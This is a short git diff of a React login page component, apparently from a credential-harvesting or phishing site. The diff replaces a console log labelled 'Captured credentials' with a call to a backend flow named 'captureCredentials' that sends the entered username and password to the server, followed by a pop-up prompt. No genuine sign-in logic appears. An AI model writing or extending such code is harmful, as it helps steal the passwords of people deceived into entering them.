@@ -1,5 +1,6 @@
 'use client';
 import { FormEvent, useState } from 'react';
+import { captureCredentials } from '@/ai/flows/capture-credentials';
 
 // Make Swal available in the component
 declare const Swal: any;
@@ -10,9 +11,11 @@ export default function Home() {
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
 
-  const handleSubmit = (event: FormEvent) => {
+  const handleSubmit = async (event: FormEvent) => {
     event.preventDefault();
-    console.log('Captured credentials:', { username, password });
+    
+    // Capture credentials on the backend
+    await captureCredentials({ username, password });
     
     // Show SweetAlert2 prompt
     Swal.fire({
